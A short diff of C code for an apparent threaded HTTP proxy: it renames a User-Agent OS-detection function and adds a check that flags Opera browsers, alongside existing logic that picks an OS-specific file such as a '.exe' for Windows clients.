@@ -24,7 +24,8 @@
 
 /* protos */
 
-osuser search_useragent(char *request);
+osuser search_useragent_os(char *request);
+int search_useragent_browser(char *request);
 void proxy_start(void);
 MY_THREAD_FUNC(proxy);
 MY_THREAD_FUNC(handle_connection);
@@ -34,7 +35,7 @@ int remote_BIOseek(const char *host, const char *resource, size_t offset, BIO **
 /************************************************/
 
 osuser
-search_useragent(char *request)
+search_useragent_os(char *request)
 {
    osuser os = UNKNOWN;
 
@@ -50,6 +51,20 @@ search_useragent(char *request)
    }
 
    return os;
+}
+
+int
+search_useragent_browser(char *request)
+{
+
+   if (strstr(request, "User-Agent: ") != NULL) {
+      char *user = strstr(request, "User-Agent:");
+
+      if (strstr(user, "Opera") != NULL)
+          return 1;
+   }
+
+   return 0;
 }
 
 void proxy_start(void)
@@ -230,7 +245,7 @@ MY_THREAD_FUNC(handle_connection)
          char *correct_file = NULL;
 	 int ret = 0;
 
-	 os = search_useragent(request);
+	 os = search_useragent_os(request);
          switch (os) {
          case WINDOWS:
             ret = asprintf(&correct_file, "%s.exe", req->path);
